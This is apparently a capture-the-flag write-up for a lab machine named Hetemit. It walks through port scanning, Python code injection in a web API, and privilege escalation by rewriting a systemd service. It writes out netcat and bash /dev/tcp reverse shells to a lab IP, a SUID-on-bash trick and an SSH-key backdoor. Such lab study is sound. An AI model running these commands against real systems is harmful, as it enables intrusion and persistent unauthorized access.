# Hetemit

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.201.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 15:27 +08
Warning: 192.168.201.117 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.201.117
Host is up (0.18s latency).
Not shown: 65479 filtered tcp ports (no-response), 49 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2
```

Lots of ports. FTP allows for anonymous access, but just hangs.&#x20;

### Web Enumeration -> Python Code Injection

Port 80 had the default Apache HTTP Server:

<figure><img src="../../../.gitbook/assets/image (1177).png" alt=""><figcaption></figcaption></figure>

Ran a directory scan on this and didn't find much.

Port 50000 had a simple API running:

<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

If we use the `/generate` option, it just returns us this:

```
$ curl http://192.168.201.117:50000/generate
{'email@domain'}
```

I tried sending POST requests to this:

<figure><img src="../../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

Not too sure what to do with that token. However, we notice that this is running a Python server. The `/verify` endpoint also accepts POST requests, but it always seems to fail:

<figure><img src="../../../.gitbook/assets/image (3207).png" alt=""><figcaption></figcaption></figure>

Since this was running a Python based server, we can try some Python code injection.&#x20;

<figure><img src="../../../.gitbook/assets/image (3557).png" alt=""><figcaption></figcaption></figure>

This looks like it works. Another test confirms that it works:

<figure><img src="../../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>

So this script has the `os` module imported, meaning we can get an easy reverse shell:

```python
os.system("nc -e /bin/bash 192.168.45.191 21")
```

<figure><img src="../../../.gitbook/assets/image (3136).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Misconfigured Services + Reboot

The user is able to reboot the system:

```
[cmeeks@hetemit ~]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

This indicates to me that there is some kind of startup script to exploit. I ran a `linpeas.sh` scan on the machine to enumerate, and it found quite a few misconfigured services:

<figure><img src="../../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

We can overwrite this to execute a script that gives us a reverse shell. I included the SUID bit in my script just in case the shell doesn't work:

```bash
#!/bin/bash

chmod u+s /bin/bash
bash -i >& /dev/tcp/192.168.45.191/18000 0>&1
```

I also included my SSH key within the `authorized_keys` folder for backdoor access.

```bash
cd ~
mkdir .ssh
echo 'KEY' >> .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
chmod 700 .ssh
```

Afterwards, using `vi` we can edit the service file:

```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/shell.sh
TimeoutSec=30
RestartSec=15s
User=root
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Then, we can run `sudo /sbin/reboot` to restart the machine. Then we just have to wait for a bit before we can SSH back in. The reverse shell didn't work for some reason, but the SUID binary command did:

<figure><img src="../../../.gitbook/assets/image (1231).png" alt=""><figcaption></figcaption></figure>

Rooted!
